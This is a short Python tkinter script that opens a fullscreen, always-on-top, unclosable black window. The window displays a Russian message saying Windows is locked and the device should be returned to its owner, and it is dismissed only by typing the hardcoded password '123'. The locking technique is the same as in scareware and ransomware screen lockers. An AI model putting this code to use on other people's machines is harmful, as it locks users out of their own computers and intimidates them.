from tkinter import *


def winlock():
    root = Tk()

    def quit():
        pass

    def CheckPassword(arg):
        if password.get() == "123":
            root.destroy()

    bg = "black"
    font = "Arial 25 bold"
    root["bg"] = bg
    root.protocol("WM_DELETE_WINDOW", quit)
    root.attributes("-topmost", 1)
    root.attributes("-fullscreen", 1)
    root.overrideredirect(1)

    Label(
        text="Ваш windows заблокирован, верните устройство владельцу",
        fg="red",
        bg=bg,
        font=font,
    ).pack()
    Label(text="\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()

    password = Entry(font=font)
    password.pack()
    password.bind("<Return>", CheckPassword)
    root.mainloop()
